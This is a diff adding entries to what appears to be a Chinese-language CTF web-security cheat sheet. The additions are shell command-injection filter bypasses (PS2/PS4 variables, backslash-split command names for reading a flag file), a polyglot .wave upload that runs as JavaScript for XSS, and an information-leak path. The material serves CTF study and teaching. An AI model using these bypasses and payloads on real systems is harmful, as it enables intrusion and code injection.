@@ -601,10 +601,17 @@ PS1=$(cat flag)
         - `${PATH:0:1}   => '/'`
         - `${PATH:1:1}   => 'u'`
         - `${PATH:0:4}   => '/usr'`
+    - `${PS2}` 
+        - `>`
+    - `${PS4}`
+        - `+`
 - Empty String
     - `cat fl""ag`
     - `cat fl''ag`
         - `cat "fl""ag"`
+
+- 反斜線
+    - `c\at fl\ag`
 
 ## ImageMagick (ImageTragick)
 
@@ -1967,6 +1974,18 @@ xxe.dtd:
     - `[a](javascript:window.onerror=alert;throw%201)`
     - ...
 
+- 文件XSS
+    - Example: PlaidCTF 2018 wave XSS
+    - 上傳.wave檔 (會檢查signatures)
+      ```
+        RIFF`....WAVE...` 
+        alert(1); 
+        function RIFF(){}
+      ```
+        - 變成合法的js語法
+        - wave在apache mime type中沒有被定義
+        - `<script src="uploads/this_file.wave">`
+
 ## Online Encoding / Decoding
 - http://monyer.com/demo/monyerjs/
 
@@ -2107,6 +2126,7 @@ state[i] = state[i-3] + state[i-31]`
  - Information leak
      - .git / .svn
      - robots.txt
+     - /.well-known
      - .DS_Store
      - .htaccess
      - .pyc
